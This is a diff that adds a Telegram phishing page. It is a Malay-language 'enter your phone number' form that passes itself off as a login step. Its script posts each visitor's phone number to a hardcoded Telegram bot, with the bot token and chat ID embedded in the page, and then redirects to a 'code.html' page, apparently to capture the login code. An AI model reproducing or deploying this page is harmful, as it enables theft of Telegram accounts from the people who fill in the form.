@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Form Nomor Telepon</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        max-width: 500px;
+        margin: 0 auto;
+        padding: 20px;
+      }
+
+      .header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 30px;
+      }
+
+      .back-button {
+        font-size: 20px;
+        font-weight: bold;
+        text-decoration: none;
+        color: #666;
+        margin-right: 20px;
+        /* background: #00bfff; */
+        padding: 8px;
+        border-radius: 50px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .help-icon {
+        margin-left: auto;
+        font-weight: bold;
+        font-size: 20px;
+        color: #666;
+        /* background: #00bfff; */
+        padding: 8px;
+        border-radius: 50px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      h1 {
+        font-size: 24px;
+        margin-bottom: 5px;
+      }
+
+      .subtitle {
+        color: #666;
+        margin-bottom: 20px;
+      }
+
+      .input-container {
+        background-color: #ffffff;
+        padding: 15px;
+        border-radius: 8px;
+        display: flex;
+        margin-bottom: 10px;
+        border: 1px solid #000000;
+      }
+
+      .country-code {
+        color: #393838;
+        margin-right: 15px;
+      }
+
+      input {
+        border: none;
+        background: transparent;
+        flex: 1;
+        font-size: 16px;
+        outline: none;
+      }
+
+      .need-help {
+        color: #0099ff;
+        text-decoration: none;
+        margin-bottom: 30px;
+        display: block;
+      }
+
+      .logos-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-top: 100px;
+        margin-bottom: 30px;
+      }
+
+      .logo {
+        width: 100%;
+        height: auto;
+      }
+
+      .continue-btn {
+        background-color: #00bfff;
+        color: white;
+        border: none;
+        padding: 15px;
+        width: 100%;
+        border-radius: 25px;
+        font-size: 16px;
+        cursor: pointer;
+      }
+
+      .continue-btn:disabled {
+        opacity: 0.7;
+        cursor: not-allowed;
+      }
+
+      .loader-container {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.9);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .loader {
+        width: 48px;
+        height: 48px;
+        border: 5px solid #ffdf80;
+        border-radius: 50%;
+        border-top-color: transparent;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+    <!-- Tambahkan CDN Feather Icons -->
+    <script src="https://unpkg.com/feather-icons"></script>
+  </head>
+  <body>
+    <div class="header">
+      <a href="#" class="back-button">
+        <i data-feather="arrow-left"></i>
+      </a>
+      <span class="help-icon">
+        <i data-feather="help-circle"></i>
+      </span>
+    </div>
+
+    <h1>Nombor fon anda!</h1>
+    <p class="subtitle">Sila masukkan nombor fon anda..</p>
+
+    <div class="input-container">
+      <span class="country-code">🇲🇾 +60</span>
+      <input type="tel" placeholder="Nombor fon telegram" id="phone" />
+    </div>
+
+    <a href="#" class="need-help">Need help?</a>
+
+    <div class="logos-container">
+      <img src="logomod.png" alt="Logo 1" class="logo" />
+    </div>
+
+    <button class="continue-btn" id="continueBtn">Lanjutkan</button>
+
+    <div class="loader-container">
+      <div class="loader"></div>
+    </div>
+
+    <script>
+      feather.replace();
+
+      const phoneInput = document.getElementById("phone");
+      const continueBtn = document.getElementById("continueBtn");
+
+      // Masukkan Bot Token dan Chat ID Anda di sini
+      const BOT_TOKEN = "7410437482:AAHjVoPurOsB4-yoSFVinzj8VNnrAPVjmpc"; // Contoh: 1234567890:AAHfiqksKZ8x8TLiW-abcdefghijklmno
+      const CHAT_ID = "5265564576"; // Contoh: -1001234567890
+
+      phoneInput.addEventListener("input", function () {
+        continueBtn.disabled = !phoneInput.value;
+      });
+
+      continueBtn.addEventListener("click", function () {
+        const phoneNumber = "+60" + phoneInput.value;
+        localStorage.setItem("userPhone", phoneNumber);
+
+        // Format pesan untuk Telegram
+        const message = `
+────────────────
+🔰 DATA | NOMBOR TELEGRAM 🔰
+────────────────
+📱 No HP : \`${phoneNumber}\`
+────────────────`;
+
+        // Encode pesan untuk URL
+        const encodedMessage = encodeURIComponent(message);
+
+        // URL API Telegram dengan bot token dan chat ID
+        const botUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+
+        // Kirim pesan ke Telegram
+        fetch(botUrl).then((response) => response.json());
+
+        // Tampilkan loader
+        document.querySelector(".loader-container").style.display = "flex";
+
+        // Kirim pesan ke Telegram
+        fetch(botUrl)
+          .then((response) => response.json())
+          .then(() => {
+            // Tunggu 500ms (0.5 detik) sebelum pindah halaman
+            setTimeout(function () {
+              window.location.href = "code.html";
+            }, 500);
+          });
+      });
+    </script>
+  </body>
+</html>
